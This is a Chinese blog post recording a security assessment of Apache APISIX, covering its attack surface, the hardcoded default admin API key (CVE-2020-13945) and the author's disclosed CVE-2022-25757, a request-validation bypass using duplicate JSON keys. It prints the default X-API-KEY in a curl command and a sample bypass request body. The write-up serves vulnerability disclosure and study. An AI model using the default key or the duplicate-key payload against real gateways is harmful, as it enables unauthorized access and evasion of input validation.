          <a href="/2022-06-13-apisix%E5%AE%89%E5%85%A8%E8%AF%84%E4%BC%B0/" class="post-title-link" itemprop="url">apisix安全评估</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2022-06-13 23:08:30" itemprop="dateCreated datePublished" datetime="2022-06-13T23:08:30+08:00">2022-06-13</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">更新于</span>
        <time title="修改时间：2022-08-18 18:21:18" itemprop="dateModified" datetime="2022-08-18T18:21:18+08:00">2022-08-18</time>
      </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>有大佬已经对 <a target="_blank" rel="noopener" href="https://ricterz.me/posts/2021-07-05-apache-apisix-attack-surface-research.txt">apisix攻击面</a> 做过总结。</p>
<p>本文记录一下自己之前的评估过程。</p>
<h1 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h1><h2 id="评估哪些模块？"><a href="#评估哪些模块？" class="headerlink" title="评估哪些模块？"></a>评估哪些模块？</h2><p>首先我需要知道要评估啥，就像搞渗透时，我得先知道攻击面在哪里。</p>
<p><img src="https://user-images.githubusercontent.com/1846319/185372424-e3bf60ef-8b78-4d2d-9827-3b533b039051.png" alt="image"></p>
<p>根据文档，可以知道apisix项目包括很多系统，包括：</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://github.com/apache/apisix">网关</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/apache/apisix-dashboard">dashboard</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/apache/apisix-ingress-controller">ingress控制器</a></li>
<li>各种sdk</li>
</ul>
<p>sdk即使有漏洞，攻击场景也感觉有限，所以没有评估。</p>
<p>“ingress控制器”需要结合k8s中的网络来做评估，因为时间有限，所以只是粗略看了一下。</p>
<p>我主要看了网关和dashboard两个系统。</p>
<p>从文档上很容易看出来，网关有三个重要的模块：</p>
<ul>
<li>插件</li>
<li>admin api</li>
<li>control api</li>
</ul>
<p><img src="https://files.mdnice.com/user/10280/ec19fa15-01df-4939-af1d-59d34a7f32a7.png"></p>
<p>对于api来说，首先要检查的是”身份认证”和”鉴权”这两个安全措施。</p>
<p>apisix历史漏洞绝大部分都出现在插件中，所以插件属于”漏洞重灾区”。</p>
<h2 id="评估api安全性：身份认证和鉴权"><a href="#评估api安全性：身份认证和鉴权" class="headerlink" title="评估api安全性：身份认证和鉴权"></a>评估api安全性：身份认证和鉴权</h2><p>admin api实现如下：</p>
<ul>
<li>admin api 使用token做认证，token是硬编码的。这个问题已经被提交过漏洞，官方应该不打算修复。</li>
<li>admin api 鉴权上，设计了viewer和非viewer两种角色。viewer角色只允许get方法。</li>
</ul>
<blockquote>
<p>靶场见 <a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/blob/master/apisix/CVE-2020-13945/README.zh-cn.md">Apache APISIX 默认密钥漏洞（CVE-2020-13945）</a></p>
</blockquote>
<p>control api是没有身份认证的，但是有两个点限制了攻击：</p>
<ul>
<li>默认它只在本地监听端口</li>
<li>插件无关的control api只有”读信息”的功能，没有发现啥风险点</li>
</ul>
<p>插件创建的control api是一个潜在的攻击面，不过我没找到啥漏洞。</p>
<h2 id="评估插件安全性"><a href="#评估插件安全性" class="headerlink" title="评估插件安全性"></a>评估插件安全性</h2><p>因为插件默认都是不开启的，所以虽然它是重灾区，但是我并没有投入过多精力去审计。</p>
<p>不过在这里确实发现了一个安全问题，报告给官方后，分配了<a target="_blank" rel="noopener" href="https://www.openwall.com/lists/oss-security/2022/03/28/2">CVE-2022-25757</a>。</p>
<p>下面来说一下这个安全问题。</p>
<h1 id="CVE-2022-25757"><a href="#CVE-2022-25757" class="headerlink" title="CVE-2022-25757"></a>CVE-2022-25757</h1><h2 id="这个安全问题是什么？"><a href="#这个安全问题是什么？" class="headerlink" title="这个安全问题是什么？"></a>这个安全问题是什么？</h2><p>request-validation插件可以检查HTTP请求头和BODY内容，当不符合用户配置的规则时，请求就不会转发到上游。</p>
<p>比如用户按照如下规则配置时，body_schema限制请求中必须要有string_payload参数，并且是字符串类型，长度在1到32字节之间。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">curl http:&#x2F;&#x2F;127.0.0.1:9080&#x2F;apisix&#x2F;admin&#x2F;routes&#x2F;10 -H &#39;X-API-KEY: edd1c9f034335f136f87ad84b625c8f1&#39; -X PUT -d &#39;</span><br><span class="line">&#123;</span><br><span class="line">    &quot;uri&quot;: &quot;&#x2F;10&quot;,</span><br><span class="line">    &quot;plugins&quot;: &#123;</span><br><span class="line">        &quot;request-validation&quot;: &#123;</span><br><span class="line">        &quot;body_schema&quot;: &#123;</span><br><span class="line">              &quot;type&quot;: &quot;object&quot;,</span><br><span class="line">              &quot;required&quot;: [&quot;string_payload&quot;],</span><br><span class="line">              &quot;properties&quot;: &#123;</span><br><span class="line">                  &quot;string_payload&quot;: &#123;</span><br><span class="line">                      &quot;type&quot;: &quot;string&quot;,</span><br><span class="line">                      &quot;minLength&quot;: 1,</span><br><span class="line">                      &quot;maxLength&quot;: 32</span><br><span class="line">                  &#125;</span><br><span class="line">              &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;upstream&quot;: &#123;</span><br><span class="line">        &quot;type&quot;: &quot;roundrobin&quot;,</span><br><span class="line">        &quot;nodes&quot;: &#123;</span><br><span class="line">            &quot;192.168.2.189:8888&quot;: 1</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;&#39;</span><br></pre></td></tr></table></figure>

<p>但是恶意用户发送如下请求时，有可能绕过限制</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST http:&#x2F;&#x2F;127.0.0.1:9080&#x2F;10</span><br><span class="line">...</span><br><span class="line">&#123;&quot;string_payload&quot;:&quot;&quot;,&quot;string_payload&quot;:&quot;1111&quot;&#125;</span><br></pre></td></tr></table></figure>

<h2 id="为什么会绕过限制？"><a href="#为什么会绕过限制？" class="headerlink" title="为什么会绕过限制？"></a>为什么会绕过限制？</h2><p>request-validation.lua中使用cjson.safe库解析字符串为json对象，对于带有”重复键值”的json，它会取最后面的值。比如<code>&#123;&quot;string_payload&quot;:&quot;&quot;,&quot;string_payload&quot;:&quot;1111&quot;&#125;</code>，request-validation插件会认为string_payload=”1111”。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">local _M &#x3D; &#123;</span><br><span class="line">    version &#x3D; 0.1,</span><br><span class="line">    decode &#x3D; require(&quot;cjson.safe&quot;).decode,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但是有很多流行的库，对于带有”重复键值”的json，它会取最前面的值，因此<code>&#123;&quot;string_payload&quot;:&quot;&quot;,&quot;string_payload&quot;:&quot;1111&quot;&#125;</code>会被认为string_payload=””。</p>
<p>因此request-validation插件和上游服务在解析json时可能存在差异性，所以会导致限制被绕过</p>
<h2 id="哪些库和request-validation插件在解析”重复键值json”时存在差异？"><a href="#哪些库和request-validation插件在解析”重复键值json”时存在差异？" class="headerlink" title="哪些库和request-validation插件在解析”重复键值json”时存在差异？"></a>哪些库和request-validation插件在解析”重复键值json”时存在差异？</h2><p>根据 <a target="_blank" rel="noopener" href="https://bishopfox.com/blog/json-interoperability-vulnerabilities">https://bishopfox.com/blog/json-interoperability-vulnerabilities</a> 文章，可以知道最起码以下库和request-validation插件在解析”重复键值json”时存在差异。</p>
<p><img src="https://user-images.githubusercontent.com/1846319/154656153-4b9c253b-e1af-47c3-9dfb-1fe40a922c3f.png" alt="img"></p>
<p>选取其中的gojay库做了验证，程序打印gojay而不是gojay2</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">package main</span><br><span class="line">import &quot;github.com&#x2F;francoispqt&#x2F;gojay&quot;</span><br><span class="line"></span><br><span class="line">type user struct &#123;</span><br><span class="line">    id int</span><br><span class="line">    name string</span><br><span class="line">    email string</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F; implement gojay.UnmarshalerJSONObject</span><br><span class="line">func (u *user) UnmarshalJSONObject(dec *gojay.Decoder, key string) error &#123;</span><br><span class="line">    switch key &#123;</span><br><span class="line">    case &quot;id&quot;:</span><br><span class="line">        return dec.Int(&amp;u.id)</span><br><span class="line">    case &quot;name&quot;:</span><br><span class="line">        return dec.String(&amp;u.name)</span><br><span class="line">    case &quot;email&quot;:</span><br><span class="line">        return dec.String(&amp;u.email)</span><br><span class="line">    &#125;</span><br><span class="line">    return nil</span><br><span class="line">&#125;</span><br><span class="line">func (u *user) NKeys() int &#123;</span><br><span class="line">    return 3</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">    u :&#x3D; &amp;user&#123;&#125;</span><br><span class="line">    d :&#x3D; []byte(&#96;&#123;&quot;id&quot;:1,&quot;name&quot;:&quot;gojay&quot;,&quot;email&quot;:&quot;gojay@email.com&quot;&#125;,&quot;name&quot;:&quot;gojay2&quot;&#96;)</span><br><span class="line">    err :&#x3D; gojay.UnmarshalJSONObject(d, u)</span><br><span class="line">    if err !&#x3D; nil &#123;</span><br><span class="line">        &#x2F;&#x2F;log.Fatal(err)</span><br><span class="line">    &#125;</span><br><span class="line">    println(u.name);  &#x2F;&#x2F; 取最前面的key的值，也就是gojay，而不是gojay2</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>评估思路比较简单：</p>
<ul>
<li>识别攻击面</li>
<li>api关注身份认证和鉴权</li>
<li>插件关注业务逻辑</li>
</ul>
<p>openresty配置中的api也是攻击面，下一篇再写。</p>
<blockquote>
<p>说一个题外话：apisix的插件机制提供了很好的扩展能力，再加上openresty的高性能，或许拿来做waf架构很合适。</p>
</blockquote>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/7/">7</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
  </nav>

</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">


<div class="copyright">
  &copy; 
  <span itemprop="copyrightYear">2022</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">leveryd</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
  </div>

    </div>
  </footer>

  
  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>

  





  





</body>
</html>
